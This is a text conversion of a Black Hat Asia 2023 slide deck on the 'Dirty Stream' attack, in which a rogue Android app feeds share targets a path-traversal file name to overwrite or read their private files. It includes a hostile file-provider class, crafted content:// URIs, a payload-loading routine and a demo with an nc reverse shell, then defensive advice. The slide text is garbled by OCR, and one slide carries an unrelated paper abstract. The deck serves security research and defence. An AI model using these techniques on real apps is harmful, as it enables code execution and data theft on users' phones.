---
title: "Dirty Stream Attack Turning Android"
speakers: ["Valsamaras"]
conference: "Black Hat"
conference_full: "Black Hat ASIA 2023"
edition: "ASIA"
year: 2023
source_pdf: "Black Hat Asia 2023 slides/AS-23-Valsamaras-Dirty-Stream-Attack-Turning-Android.pdf"
pages: 51
sha256: "61f36583bea402eae0065ea086beb09d35da3630aa5991251fb1d83520e75a2b"
text_chars: 22243
ocr_pages: 18
has_ocr: true
redacted_secrets: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-11T23:56:16Z"
---
# Dirty Stream Attack Turning Android

**Speakers:** Valsamaras  
**Conference:** Black Hat ASIA 2023  
**Source:** `Black Hat Asia 2023 slides/AS-23-Valsamaras-Dirty-Stream-Attack-Turning-Android.pdf` (51 pages)


## Slide 1

# Dirty Stream Attack Turning Android Share Targets Into Attack Vectors

Dimitrios Valsamaras Microsoft Threat Intelligence

#BHASIA @BlackHatEvents

## Slide 2

**@Ch0pin​** <u>about://me</u>

**@Ch0pin​@infosec.exchange**

`o` Engaged in computer security since 2002 `o` Android security addict for the last 5 years `o` Senior security researcher @Microsoft

`o` Father of two

`o` Writing music, guitar, piano

#BHASIA @BlackHatEvents

## Slide 3

##### Did you say Android ?

#BHASIA @BlackHatEvents

## Slide 4

### <u>Outline</u>

Data and file sharing using content providers Share Targets Dirty stream attack Impact Defense

Blackhat Sound Bytes

#BHASIA @BlackHatEvents

## Slide 5

###### <u>Content providers</u>

A Content Provider conveys ways to securely share data with other Android applications A Content Resolver is a proxy object, used to communicate with the Content Provider A Cursor Loader is used to run an asynchronous query in the background not blocking the main thread

The result of a query can be retrieved via a Cursor Object

#BHASIA @BlackHatEvents

## Slide 6

###### <u>Content providers</u>

CursorLoader

Consumer

###### ContentInterface

ContentResolver : Query / Insert / Update / Delete

ContentProvider : Query / Insert / Update / Delete

Server

Structured File

#BHASIA @BlackHatEvents

## Slide 7

###### <u>Server</u>

**ActivityThread (Main Thread)**

▪ Authority
▪ Process Name
▪ Class name
▪ Package Name

**H.handleMessage BIND_APPLICATION handleBindApplication**

`o` **H.handleMessage**

**installContentProviders**

**installProvider** ContentProvider **attachInfo**

#BHASIA @BlackHatEvents

## Slide 8

Consumer
o getContentResolver

###### <u>Consumer</u>

`o` **ApplicationContentResolver**

**query**

- {"column_1","column_2",…,"column_N"}

**content://authority/table/filename**

`o` Cursor. get [String | Int | Long | Double | Float ](column index)

#BHASIA @BlackHatEvents

## Slide 9

###### <u>File providers</u>

Subclass of the ContentProvider

Share files by creating content Uris instead of file Specify shared directories in XML format, using child elements of the <paths>

**content** ://com.example.app/test_root

**file** ://

ParcelFileDescriptor

openFile

AssetFileDescriptor

openAssetFile

#BHASIA @BlackHatEvents

## Slide 10

###### <u>The file-paths file</u>

**content://com.example/test_root/data/data/com.example/**

file:///storage/emulated/0

#BHASIA @BlackHatEvents

## Slide 11

###### <u>File providers (consumer)</u>

`o` **openInputStream**

**content://**

`o` **openAssetFileDescriptor**

**cache**

**External or Internal directory**

#BHASIA @BlackHatEvents

## Slide 12

###### <u>Content providers Security</u>

content://com.android.contacts

content://com.android.calendar

#BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
£) E
blackhat Content providers Security
/** See {@code Manifest#READ_CONTACTS} */
public static final String READ_CONTACTS = J"android.permission.READ_CONTACTS";] egntent://com.android.contacts
/** See {@code Manifest#WRITE_CONTACTS} */
public static final String WRITE_CONTACTS = “android.permission.WRITE_CONTACTS" ;
/** See {@code Manifest#SET DEFAULT _ACCOUNT_FOR CONTACTS} */
public static final String SET_DEFAULT_ACCOUNT_FOR_CONTACTS =
“android.permission.SET_DEFAULT_ACCOUNT_FOR_CONTACTS" ;
/** See {@code Manifest#READ_ CALENDAR} */
public static final String READ_CALENDAR = |"android.permission.READ_ CALENDAR"; content://com.android.calendar
/** See {@code Manifest#WRITE_CALENDAR} */
public static final String WRITE_CALENDAR = “android.permission.WRITE_CALENDAR" ;
/** See {@code Manifest#ACCESS MESSAGES ON ICC} */
public static final String ACCESS MESSAGES ON_ICC = “android.permission"™
+ ". ACCESS MESSAGES ON_ICC";
/** See {@code Manifest#SEND_SMS} */
public static final String SEND_SMS = "“android.permission.SEND_SMS";
/** See {@code Manifest#RECEIVE_SMS} */
public static final String RECEIVE_SMS = “android.permission.RECEIVE_SMS";
#BHASIA @BlackHatEvents
```

## Slide 13

###### <u>Content providers Security</u>

**FLAG_GRANT_[READ|WRITE]_URI_PERMISSION**

#BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pisek hat
ASIA 2023
Content providers Security 2
<provider android
android
android
:authorities="Jist"
:directBootAware=["true" | "false" ]
:enabled=["true" | "false" ]
android
:exported=["true" | "false"]
android
:grantUriPermissions=["“true" | "false" ]
android
android
android
android
android
android
android
android
android
</provider>
7icon=" drawable resource’
:initOrder=" integer"
android:
:multiprocess=["true" | "false"]
:name="string"
:permission=" string"
:process="string"
:readPermission=" string"
:syncable=["true" | "false"]
:writePermission="string" >
label="string resource"
GRANT_[READ|WRITE
#BHASIA @BlackHatEvents
```

## Slide 14

###### <u>Content providers Security ?</u>

###### Class: android.content.Context

_Grant permission to access a specific Uri to another package, regardless of whether that package has general permission to access the Uri's content provider._

Notice anything strange ?

#BHASIA @BlackHatEvents

## Slide 15

###### <u>Share Targets</u>

A share target is an Android application that can receive data or files from other apps **Examples: file/image/video processing, mail clients, messengers, social network, browsers ...** To create a share target:

`o` **Use an Activity with a matching intent filter OR** `o` **Use the ChooserTargetService OR** `o` **Use the Sharing shortcuts API**

#BHASIA @BlackHatEvents

## Slide 16

###### <u>Share Targets</u>

#BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
A
blackhat Share Targets
<activity android:name#" .ui.MyActivity"| >
1 ‘STREAM HANDLER: <intent-filter>
esses sense sssssssnnnet <action android:name="android.intent.action.SEND" />
<category android:name="android.intent.category.DEFAULT" />
<data android:mimeType="image/*" />
a </intent-Tilter>
? ‘INTENT FILTER ' <intent-filter>
<action android:name="android.intent.action.SEND" />
<category android :name="android.intent.category.DEFAULT" />
<data android:mimeType="text/plain" />
—qUUggUNNNNNNN </intent-filter>
3 ‘DATA TYPE <intent-filter>
<action android:name="android.intent.action.SEND_MULTIPLE" />
<category android :name="android.intent.category.DEFAULT" />
<data android:mimeType="image/*" />
</intent-filter>
</activity>
#BHASIA @BlackHatEvents
```

## Slide 17

###### <u>Sending a file</u>

Create an intent of action ACTION_SEND or ACTION_SEND_MULTIPLE Attach a file as an EXTRA_STREAM extra Define the data type

Create a new intent using the Intent.createChooser Use the startActivity to start the share-sheet dialog

#BHASIA @BlackHatEvents

## Slide 18

###### <u>Sending a file</u>

3
4
5

1 2

#BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
A
black hat Sending a file
4° Intent sendIntent = new Intent (Intent. ACTION_SEND);
2 ~ssendIntent.putExtra(Intent.EXTRA_STREAM, Uri.parse( uriString: "content: //authority/path/file"));
X_ Share with
sendiIntent.setType("image/jpeg"); 3
® ® ©
Intent shareSheet = Intent.createChooser(sendIntent, title: null); 4
HR
startActivity(shareSheet); 5
#BHASIA @BlackHatEvents
```

## Slide 19

###### <u>Handling a stream</u>

#BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Qa i eat
blackhat Handling a stream ee 3
public static final java.lang.String getFi imeCandroid.content.Context context, android.net.Uri uri) {
java.lang.String filename = ;
android.database.Cursor query = context.getContentResolver().query(uri, new java.lang.String[]{"_c ay_name"},
selection: nulL, selectionArgs: nuL1L, sortOrder: null, cancellationSignal: null);
if (query != null) {
try {
if (query.moveToFirst()) {
filename = query.getString(query.getColumnIndex( columnName: " p name"));
}
} catch (Exception e){
e.printStackTrace();
if (filename != null) {
return filename;
}
throw new java.lang.IllLegalArgumentException("Could not get filename from " + uri);
#BHASIA @BlackHatEvents
```

## Slide 20

###### <u>Handling a stream</u>

#BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
a Bis
blackhat Handling a stream ee 3
public woid c ile(Uri uri, String filename) {
InputStream inputStream = null;
File cache = new File(getFilesDir(), filename);
try {
inputStream = getApplicationContext().getContentResolver().openInputStream(uri);
java.io.FileQutputStream fileQutputStream = new java.io.FileQutputStream(cache);
copyTo(inputStream, fileOutputStream) ;
} catch (FileNotFoundException e) {
@.printStackTrace();
#BHASIA @BlackHatEvents
```

## Slide 21

###### <u>Handling a stream</u>

**Both values are controlled by the sender !**

#BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
a Bis
blackhat Handling a stream ee 3
Both values are controlled by
the sender !
public void c
InputStream inputStream = nu
File cache = new File(getFilesDir(), filename);
try {
inputStream = getAppLicationContext().getContentResolver().openInputStream(uri);
java.io.FileQutputStream fileOutputStream = new java.io.FileQutputStream(cache) ;
copyTo(inputStream, fileQutputStream);
} catch (FileNotFoundException e) {
e.printStackTrace();
#BHASIA @BlackHatEvents
```

## Slide 22

###### <u>Handling a stream</u>

#BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pisek hat
ASIA 20e3
blic static final java.lang.String getFilename(android.content.Context context, android.net.Uri uri) {
java.lang.String filename = "
221
A condensed version to just extract the file name (assuming "this" is an Activity): android.database.Cursor query = context.getContentResolver().query(uri, new java.lang.String[]{"_display_name"},
selection: null, selectionArgs: null, so ler: null, ca tionSignal: nuLL) ;
public String getFileName(Uri uri) {
String result = null;
if (uri.getScheme().equals("content")) {
Cursor cursor = getContentResolver().query(uri, null, nu nu NULL); try {
try { if (query.moveToFirst()) {
if (cursor != null && cursor.moveToFirst()) { . . . ,
filename = query.getStrin very. getCoLumnIndex( « i r display_name ;
result = cursor.getString(cursor. getColumnIndex (OpenableColumns .DISPLAY_NAN query.g g(a yg ¢ ’ ame" ))
} }
} finally { } catch (Exception e){
, cursor.close(); e.printStackTrace();
}
if (result == null) {
result = uri.getPath();
int ct result. lastIndex0f('/');
if (cut != -1) { if (filename != null) {
result = result.substring(cut + 1); return filename;
us }
}
return result; throw new java. lang. IllLegalArgumentException("Co not get filename from " + uri);
if (query != null) {
}
An Empirical Study of C++ Vulnerabilities in Crowd-Sourced Code Examples
Morteza Verdi, Ashkan Sami, Jafar Akhondali, Foutse Khomh, Gias Uddin, Alireza Karami Motlagh
Software developers share programming solutions in Q&A sites like Stack Overflow. The reuse of crowd-sourced code snippets can facilitate rapid prototyping. However, recent research shows that the shared code snippets may be
of low quality and can even contain vulnerabilities. This paper aims to understand the nature and the prevalence of security vulnerabilities in crowd-sourced code examples. To achieve this goal, we investigate security
vulnerabilities in the C++ code snippets shared on Stack Overflow over a period of 10 years. In collaborative sessions involving multiple human coders, we manually assessed each code snippet for security vulnerabilities following
CWE (Common Weakness Enumeration) guidelines. From the 72,483 reviewed code snippets used in at least one project hosted on GitHub, we found a total of 69 vulnerable code snippets categorized into 29 types. Many of the
investigated code snippets are still not corrected on Stack Overflow. The 69 vulnerable code snippets found in Stack Overflow were reused in a total of 2859 GitHub projects. To help improve the quality of code snippets shared on
Stack Overflow, we developed a browser extension that allow Stack Overflow users to check for vulnerabilities in code snippets when they upload them on the platform.
#BHASIA @BlackHatEvents
```

## Slide 23

###### <u>Adversary Model</u>

`o` User has installed a rogue app

`o` No permissions needed

(INTERNET: only in case we want to download a payload remotely )

#BHASIA @BlackHatEvents

## Slide 24

###### <u>Dirty Stream Attack</u>

###### Request to process file

What is the name of the file?

Name = ../../data/data/vuln.app/ [so | dex | js | xml | *]

openInputStream(Uri)

Content =

#BHASIA @BlackHatEvents

## Slide 25

###### <u>Dirty Stream Attack</u>

Create a customized file provider to share a payload Modify the query method to return a mal-crafted file name

Modify the openFile to return a file to descriptor to our payload

###### Minimize user interaction

#BHASIA @BlackHatEvents

## Slide 26

###### <u>Customizing the file provider</u>

#BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
blackhat Customizing the file provider
| usage
public class HostileProvider extends }|ContentProvider|{
@0verride
Public boolean onCreate() { return false; }
@i...}
public android.database.Cursor] query(android.net.Uri uri, java.lang.String[] projection, java.lang.String selection,
java.lang.String[] selectionArgs, java.lang.String sort0rder)
so olf
@0verride
public ParcelFileDescriptor jopenFile(Uri uri, String mode) throws FileNotFoundException {...}
@0verride
public ParceLFileDescriptor jopenFile(Uri uri, String mode, CancellationSignal cancellationSignal)
throws FileNotFoundexception 1...)
@0verride
public String getType(@NomNuLL Uri uri) { return null; }
@0verride
public Uri insert(@NonNull Uri uri, @NuLLable ContentVaLlues contentValues) { return null; }
@0verride
public int delete(@NonNuLL Uri uri, @NulLable String s, @NuLLable String[] strings) {...}
@0verride
public int update(@NonNull Uri uri, @NuLLable ContentValues contentValues, @NuLLable String s,
@Nullable String[] strings) {...}
iene
#BHASIA @BlackHatEvents
```

## Slide 27

###### <u>Customizing the file provider</u>

#BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
blackhat Customizing the file provider
@0verride
public android.database.Cursor queryfandroid.net.Uri uri, java.lang.String[] projection,
java.lang.String selection, java.lang.String[] selectionArgs,
java.lang.String sortOrder) {
Log.d( tag: "Incoming Query:",uri.toString());
android.database.MatrixCursor matrixCursor = new android.database.MatrixCursor
(new java.lang.String[]{"_display_name", "_size","_data","title"});
boolean doEncode = uri.getBooleanQueryParameter( key: "enc", defaultValue: false) ;
String displayName = "";
if(doEncode) {...}
else {
displayName= uri.getQueryParameter( key: "name");
}
if (displLayName.equals("nu1L"))
matrixCursor.addRow(new java.lang.Object[]{ null, uri.getQueryParameter( key: "_size"),null, null});
else
matrixCursor.addRow(new java.lang.Object[]{ displayName, uri.getQueryParameter( key: "_size"),displayName, displayName})
try dies
catch (Exception e){
e.printStackTrace();
}
Jreturn matrixCursor; |
#BHASIA @BlackHatEvents
```

## Slide 28

###### <u>Customizing the file provider</u>

Get the incoming Uri Obtain the path query parameter Return a file descriptor the path obtained from the previous step

#BHASIA @BlackHatEvents

## Slide 29

###### <u>Carrying the payload</u>

#BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
A
black hat Carrying the payload
~ Massets 223
i app-debug.apk private void writeToFilesFolderFromAssets(String filename) {
B libpayload.so try {
> Meres InputStream is = getAssets().open(filename);
BE res (generated) File filesDir = getFilesDir();
> @ Gradle Scripts File file = new File(filesDir, filename);
OutputStream os = Files.newOutputStream(Paths.get(file.getAbsolutePath()));
byte[] buff = new byte[1024];
int len;
while ((len = is.read(buff)) > 0) {
os.write(buff, off: GO, Len);
}
os.flush();
os.close();
is.close();
} catch (I0Exception e) {
e.printStackTrace();
#BHASIA @BlackHatEvents
```

## Slide 30

###### <u>Minimizing user interaction</u>

###### Target package name and component

content://com.exploit/dummy.ext?path=/data/data/com.exploit/files/payload &name=../../target_file_name.ext &size=X &enc=[ True | False ]

|_display_name
../../target_file_name.ext|_size
X|_data
../../target_file_name.ext|title
../../target_file_name.ext|
|---|---|---|---|

#BHASIA @BlackHatEvents

## Slide 31

###### <u>Exploiting Write Access</u>

`o` Loading libraries from the data directory

`o` Critical settings in the shared_prefs directory

`o` Using on-demand delivery modules

`o` Loads code dynamically (DCL)

#BHASIA @BlackHatEvents

## Slide 32

## if (file.exists())

## abort()

#BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
blsekhat
ASIA 2023
By Passing '
if (file.exists()) = abort()
#BHASIA @BlackHatEvents
```

## Slide 33

###### <u>The .bak file</u>

/data/data/com.example.app/shared_prefs/example.xml

example.xml.bak ~~example.xml~~ example.xml.bak -> example.xml

#BHASIA @BlackHatEvents

## Slide 34

## <u>READING FILES</u>

#BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pisek hat
ASIA 2023
READING FILES
#BHASIA @BlackHatEvents
```

## Slide 35

###### <u>Exploiting Read Access</u>

`o` Misconfigured content provider

`o` “Loose” file provider paths

`o` Caches the stream to a shared directory

#BHASIA @BlackHatEvents

## Slide 36

###### <u>Misconfigured Content Provider</u>

The application shares files using a content provider instead of a file provider. **content://com.vulnerable.app/file_path/../../../shared_prefs/user_auth.xml**

#BHASIA @BlackHatEvents

## Slide 37

###### “Loose” file provider paths

**content://com.vulnerable.app/root/**

**data/data/com.vulnerable.app/shared_prefs/user_auth.xml**

#BHASIA @BlackHatEvents

## Slide 38

###### <u>Caching to a shared dir</u>

file:///sdcard/path/to/cache/file

Or not sanitizing the displayName query parameter **content://com.vulnerable.app/data/data/com.vulnerable.app/shared_prefs/user_auth.xml ?displayName=../../../../../attacker/readable/directory**

#BHASIA @BlackHatEvents

## Slide 39

###### <u>Impact</u>

**20 Android Apps Sample having > 100M installs**

#BHASIA @BlackHatEvents

## Slide 40

#### <u>Code Execution Show Case</u>

#BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pisek hat
ASIA 2023
Code Execution Show Case
#BHASIA @BlackHatEvents
```

## Slide 41

###### <u>Code Execution Show Case</u>

#BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
a i a
blackhat Code Execution Show Case |
GE Browser - Fast & Safe
aeeeaE ORCA S|
<activity-alias android: label="@string/reader_thdcall_filereader_office" droid: icon=
"@d sh arraiec et doc" android:name="com._ nn DocReaderActivity" android: exported=
"true" android:excludeFr} pRecents="true" android: LlaunchMode="singleTask" android:screenOrientation="user"
android: configChanges=" enSize|orientation|keyboarp@lidden" android: targetActivity=
‘ME 25 .ctivity"> i]
<intent-filter>
<action android:name="android. intent.action.SEND"/>
<category android: name="android. intent. category.DEFAULT"/>
<data android:mimeType="application/msword"/>
<data android:mimeType="application/vnd.openxmlformats—of ficedocument.wordprocessingml.document"/>
<data android:mimeType="application/rtf"/>
<data android:mimeType="text/rtf"/>
</intent-filter>
#BHASIA @BlackHatEvents
```

## Slide 42

###### <u>Code Execution Show Case</u>

**md5** (uri)

**/storage/emulated/0/Android/data/deducted/cache/.deducted/ Filename returned from the file provider**

#BHASIA @BlackHatEvents

## Slide 43

###### <u>Code Execution Show Case</u>

#BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
blackhat Code Execution Show Case |
[ p>] Entering:
‘arglel: : : 7 :
load.txt&name=../../. _/AAAAAAAAAAAARenc= False& size=134343 typ=text/rtf F1g-0x10400001 cmp=( .DocReader/
ctivity clip={text/rtf {UCcontent)}} Chas extras) }
\carg[1]: @cbcafea
\Larg[2]: pa.g@1d47643
[ ««<« ] Exiting com.- tentCal LExtension.r
\_Returns: undefined
[ «4 ] Exiting com.- tentCal LExtension.h
\_Returns: undefined
IFile $init called! >: /data/user/@/ prefs/public_settings.xml
IFile $init called! >: /data/user/0/ prefs/com.google.android.gms .measure
ment prefs xml
IFile $init called| >: /storage/emulated/@/Android/data/com. XeaderTemp/thra
all/fileprovider8c7682a31lada@c4efal7cc260716391a/../../../AAAAAAAAAAAA
barbet : /storage/emuLated/@/Android/data/com. ; /cache # 1s -al
“totat 15
drwxrws--- 3 10645 1078 3452 Feb 1 16:50.
drwxrws--- 4 10645 1078 3452 Feb 1 14:26 ..
drwxrws--- 4 10645 1078 3452 Feb 1 15:31 .ReaderTemp
-rw-rw---- 1 10645 1078 31 Feb 1 16:39 AAAAAAAAAAAA
#BHASIA @BlackHatEvents
```

## Slide 44

###### <u>Code Execution Show Case</u>

Can we replace the native libraries ?

#BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
A
blackhat Code Execution Show Case |
Can we replace the native libraries ?
Intent intent = new Intent( action: "android.intent.action.SEND").setClassName( packageName ‘con a
className “com. Do cReaderactivity");
intent.putExtra( name: "android.intent.extra.STREAM", Uri.parse("content://com.exploit/a.zip?path=/data/data/com
.expLloit/files/exploit.apk&name=,./../../../../../../../../../../../data data/con xy
files/splitcompat/4155Averified-splits
#BHASIA @BlackHatEvents
```

## Slide 45

###### <u>Code Execution Show Case</u>

Can we replace the native libraries ? What about ?

**/data/data/deducted/files/splitcompat/** [v]/ **native-libraries/** [lib – config][arch].apk/ **lib[name].so**

**~~That wouldn't always work~~**

#BHASIA @BlackHatEvents

## Slide 46

###### <u>Code Execution Show Case</u>

Can we replace the native libraries ? What about ?

**/data/data/deducted/files/splitcompat/** [v]/ **verified-splits/native.apk**

#BHASIA @BlackHatEvents

## Slide 47

###### <u>Code Execution Show Case</u>

#BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
AQ
blackhat Code Execution Show Case
Pixel 5 eoee x4 ne 192.168.1.7 4444
713P BSS: Roo r-chOpin@® [mackis.home] ~/Desktop
\» adb install PhoenixExploit.apk
Performing Streamed Install
Success
-ch@pin@ [mackis.home] ~/Desktop
i» Ls» ne 192.168.1.7 4444
/system/bin/sh: can't find tty fd: No such device or address
/system/bin/sh: warning: won't have full job control
wvSsid
Uid=10451(U0_0451) gid=10451(ue_0451) groups=10451(u0_0451) , 3002(net_bt) , 3003(inet) ,9997(everybody) , 20451(u@_a451_cache) ,5@451(all_a451) context=u:r:untrusted_app:s®:c]
5,257, c512,c768
vsti
<_ sample.7z.rar
Unable to open this file
G Howt
ar file?
#BHASIA @BlackHatEvents
```

## Slide 48

###### <u>Beyond Share Targets</u>

Any interaction with another app that might involve an external content provider must be handled as untrusted

#BHASIA @BlackHatEvents

## Slide 49

###### <u>Securing Share Targets</u>

`o` Ensure that the incoming stream matches the filter criteria `o` If possible, ignore the _display_name

`o` If not, take extra steps to sanitize it

- Canonicalize the file name

   - Isolate the filename

      - Filter out special characters

#BHASIA @BlackHatEvents

## Slide 50

###### <u>Blackhat Sound Bytes</u>

`o` Consider all data originating outside your app’s private sphere as untrusted.

Validate the data type, ignore the filename whenever is possible.

`o` Do not load executables from the data directory Avoid loading libraries, dex files etc. Replace them with clean copies whenever is possible.

`o` Never install applications from untrusted sources

PlayStore performs regular checks to ensure that applications meet certain criteria.

#BHASIA @BlackHatEvents

## Slide 51

@ch0pin ch0pin@infosec.echange

References: <u>News, Techniques & Guides | Oversecured Blog</u>

<u>Improperly Exposed Directories to FileProvider | Android Developers</u>

#BHASIA @BlackHatEvents
